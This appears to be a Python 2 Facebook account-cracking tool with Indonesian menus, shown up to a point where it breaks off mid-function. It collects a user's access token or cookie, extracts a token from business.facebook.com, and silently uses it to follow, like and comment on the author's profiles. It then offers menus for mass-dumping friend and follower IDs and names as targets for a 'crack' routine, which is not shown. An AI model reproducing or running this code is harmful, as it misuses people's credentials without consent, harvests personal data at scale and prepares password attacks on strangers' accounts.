#*-coding:utf-8-*
import os, sys, re, time, json, requests, random, datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
reload(sys)
sys.setdefaultencoding("utf-8")

"""
Kalo Mau Ubah Bot Nya Izin Dulu ! 

Faham ?
"""

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Useragent
ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])

# Logo
___logo___ = ("""%s ____\n|  _ \ _   _ _ __ ___  _ __\n%s| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n%s|____/ \__,_|_| |_| |_| .__/\n                      |_|
"""%(H,H,P,P))

# Penampung
loop = 0
ok = []
cp = []

# Login
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s1%s]%s Login Pakai Token"%(B,P,B,P))
    print("%s[%s2%s]%s Login Pakai Cookie"%(B,P,B,P))
    print("%s[%s3%s]%s Dapatkan Token Or Cookie"%(B,P,B,P))
    print("%s[%s4%s]%s Keluar"%(K,P,K,P))
    ___login___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,H))
    if ___login___ in ['1','01']:
        try:
            ___token___ = raw_input("%s[%s?%s]%s Token :%s "%(B,P,B,P,K))
            if ___token___ in ['',' ']:
                exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
            xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
            print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
            open('login.txt','w').write(___token___)
            ___follow___()
        except (KeyError):
            exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    elif ___login___ in ['2','02']:
        try:
            ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
            if ___cookie___ in ['',' ']:
                exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
            # Terimakasih untuk dullah!
            data = requests.get('https://business.facebook.com/business_locations', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
                'referer'                   : 'https://www.facebook.com/',
                'host'                      : 'business.facebook.com',
                'origin'                    : 'https://business.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
            }, cookies = {
                'cookie'                    : ___cookie___
            })
            find_token = re.search('(EAAG\w+)', data.text)
            if find_token is None:
                exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
            open('login.txt','w').write(find_token.group(1))
            try:
                xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(find_token.group(1))).json()
                print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
                ___follow___()
            except (KeyError):
                exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (AttributeError,UnboundLocalError):
            exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    elif ___login___ in ['3','03']:
        print("%s[%s?%s]%s Anda Akan Di Arahkan Ke Youtube Atau Browser"%(B,H,B,P));sleep(2)
        os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
        exit("%s[%s!%s]%s Ketik ulang %s«%spython2 dump.py%s»"%(B,K,B,P,H,P,H))
    elif ___login___ in ['4','04']:
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Bot Follow
def ___follow___():
    try:
        ___token___ = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        web = datetime.datetime.now()
        ___waktu___ = web.strftime("%H:%M:%S/%d-%m-%Y")
        ___hour___ = web.hour
        if 06 <= ___hour___ < 11:
            ___ucapkan___ = ('Selamat Pagi 💙')
        elif 11 <= ___hour___ < 15:
            ___ucapkan___ = ('Selamat Siang 💛')
        elif 15 <= ___hour___ < 18:
            ___ucapkan___ = ('Selamat Sore 🧡')
        else:
            ___ucapkan___ = ('Selamat Malam 🖤')
        ___kata___ = random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
        ___komen___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
        ___komen2___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
        ___komen3___ = random.choice(['Hello Bro','Mantap Bang','Keren Bang','Very Nice','Super','Hallo Bang'])
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token___)) #rozhak
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token___)) #rozhak2
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token___)) #muhammad rozhak
        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(___token___)) # foto profil
        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
        requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Muhammad Abill
    except:
        exit("%s[%s!%s]%s Login Gagal"%(P,M,P,M))
    print("%s[%s*%s]%s Login Berhasil"%(H,P,H,P))
    ___menu___()
# Menu
def ___menu___():
    os.system('clear')
    print(___logo___)
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        xoz = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
        print("%s[%s•%s]%s Welcome :%s %s"%(B,P,B,P,H,xoz['name']))
        try:
            print("%s[%s*%s]%s Email :%s %s"%(B,P,B,P,H,xoz['email']))
        except:
            print("%s[%s*%s]%s Email :%s email_is_none@gmail.com"%(B,P,B,P,H))
        print("%s[%s•%s]%s User :%s %s"%(B,P,B,P,H,xoz['id']))
    except (KeyError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2);os.system('rm - rf login.txt')
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,M,P,M))
    print("\n%s[%s1%s]%s Dump ID Publik Masal Acak (2004-2021)"%(H,U,H,P))
    print("%s[%s2%s]%s Dump ID Publik Masal Old (2009-2006)"%(H,U,H,P))
    print("%s[%s3%s]%s Dump ID Publik Masal New (2020-2021)"%(H,U,H,P))
    print("%s[%s4%s]%s Dump ID Publik Very Old (2006-2009)"%(H,U,H,P))
    print("%s[%s5%s]%s Dump ID Follower Old (2015-2006)"%(H,U,H,P))
    print("%s[%s6%s]%s Dump ID Follower New (2021-2020)"%(H,U,H,P))
    print("%s[%s7%s]%s Dump ID Publik Acak (2021-2004)"%(H,U,H,P))
    print("%s[%s8%s]%s Dump ID Publik Old (2006-2015)"%(H,U,H,P))
    print("%s[%s9%s]%s Dump ID Publik New (2021-2020)"%(H,U,H,P))
    print("%s[%s10%s]%s Start Crack %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s11%s]%s Lihat Hasil Crack"%(H,U,H,P))
    print("%s[%s12%s]%s Laporkan Bug"%(H,U,H,P))
    print("%s[%s13%s]%s Hapus Token"%(H,U,H,P))
    ___menu___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___menu___ in ['1','01']:
        ___masal___()
    elif ___menu___ in ['2','02']:
        ___masal2___()
    elif ___menu___ in ['3','03']:
        ___masal3___()
    elif ___menu___ in ['4','04']:
        ___very___()
    elif ___menu___ in ['5','05']:
        ___follower___()
    elif ___menu___ in ['6','06']:
        ___follower2___()
    elif ___menu___ in ['7','07']:
        ___acak___()
    elif ___menu___ in ['8','08']:
        ___old___()
    elif ___menu___ in ['9','09']:
        ___new___()
    elif ___menu___ in ['10']:
        ___metode___()
    elif ___menu___ in ['11']:
        print("\n%s[%s1%s]%s Lihat Hasil Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s Lihat Hasil Cp.txt"%(B,P,B,P))
        print("%s[%s3%s]%s Kembali"%(B,K,B,P))
        ___hasilz___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___hasilz___ in ['1','01']:
            try:
                ___ok___ = open('Results/Ok.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s Hasil Ok.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total Hasil Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s Hasil Cp.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total Hasil Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        elif ___hasilz___ in ['3','03']:
            ___menu___()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['12']:
        print("%s[%s*%s]%s Anda Akan Diarahkan Ke Whatsapp"%(B,P,B,P));sleep(2)
        os.system("xdg-open https://wa.me/6285727173376?text=Hallo%20Bang%20Rozhak")
        exit()
    elif ___menu___ in ['13']:
        os.system('rm -rf login.txt')
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Masal Acak
def ___masal___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Jumlah ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Nama File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Masal Old
def ___masal2___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Jumlah ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Nama File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:10] in ['1000000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:9] in ['100000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:8] in ['10000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Masal new
def ___masal3___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Jumlah ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Nama File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if a['id'][:5] in ['10005','10006','10007','10008']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Very Old
def ___very___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("[!] Jangan Kosong")
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name']))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Follower Old
def ___follower___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name']))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:6] in ['100001','100002','100003','100004','100005','100006','100007','100008','100009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Follower New
def ___follower2___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Publik Acak
def ___acak___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            file.write(a['id']+"<=>"+a['name']+'\n')
            print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Publik Old
def ___old___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:6] in ['100001','100002','100003','100004','100005','100006','100007','100008','100009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
